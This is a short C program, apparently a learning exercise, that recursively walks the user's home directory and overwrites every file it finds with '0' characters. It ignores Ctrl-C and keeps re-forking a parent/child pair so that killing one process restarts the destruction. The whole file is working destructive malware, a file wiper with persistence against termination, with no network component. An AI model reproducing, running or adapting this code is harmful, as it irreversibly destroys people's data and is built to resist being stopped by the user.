#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <pwd.h>

void noStop(int sig);
void mainLoop(pid_t p);

// code adapted from stack overflow to calculate total size of a dir
// the search now also writes an amount of zeros equal to the size of the file in every file that has found.

static long destroyAll(char *dirname, pid_t parent){
  FILE *p;
  DIR *dir;
  pid_t pid;
  dir = opendir(dirname);
  if (dir == 0)
    return 0;

  struct dirent *dit;
  struct stat st;
  long size = 0, i;
  long total_size = 0;
  char filePath[NAME_MAX];

  while ((dit = readdir(dir)) != NULL)
  {
    if (kill(parent, 0) != 0) {
      puts("parent is kill, forking");
      pid = fork();
      if (pid != 0) {
        puts("im a parent now");
        mainLoop(pid);
      }
    }
    if ( (strcmp(dit->d_name, ".") == 0) || (strcmp(dit->d_name, "..") == 0) )
      continue;

    sprintf(filePath, "%s/%s", dirname, dit->d_name);
    if (lstat(filePath, &st) != 0)
      continue;
    size = st.st_size;

    if (S_ISDIR(st.st_mode))
    {
      long dir_size = destroyAll(filePath, parent) + size;
      total_size += dir_size;
    }
    else
    {
      total_size += size;
      p = fopen(filePath, "wb");
      for (i = 1; i < size; i++) {
        fputs("0", p);
      }   
      fclose(p);
    }
  }
  return total_size;
}
// end of adapted code from stack overflow

int main (int argc, char *argv[]) {
  pid_t pid = 0;
  printf("%d\n",NAME_MAX);
  if (signal(SIGINT, noStop) == SIG_ERR)
    puts("cant catch signal SIGINT");
  pid = fork();
  if (pid == 0) {
    puts("child");
    mainLoop(pid);
  }
  else {
    if (pid > 1) {
      puts("parent");
      mainLoop(pid);
    }
    else {
      puts ("erro no fork");
    }
  }
}

void mainLoop(pid_t p) {
  int x = 1, status, forked = 0;
  pid_t pid, parent;
  char *homedir;
  if (p == 0) {
    parent = getppid();
    // nice way to get the home user
    if ((homedir = getenv("HOME")) == NULL) { 
      homedir = getpwuid(getuid())->pw_dir;
    }
    // used to test in specific folder.
    // strcat(homedir, "/test");
    puts(homedir);
    // print how many bytes of data were overwritten
    printf("%ld\n", destroyAll(homedir, parent));
  }
  else {
    waitpid(-1, &status, 0);
    if (WIFSIGNALED(status)) {
      pid = fork();
      if (pid == 0) {
        puts("child");
        mainLoop(pid);
      }
      else {
        if (pid > 1) {
          puts("parent");
          mainLoop(pid);
        }
        else {
          puts ("erro no fork");
        }
      }
    }
    else {
      puts("filho terminou");
    }
  }
}

void noStop(int sig) {
  if (sig == SIGINT) {
    puts("You can't interrupt me");
  }
}
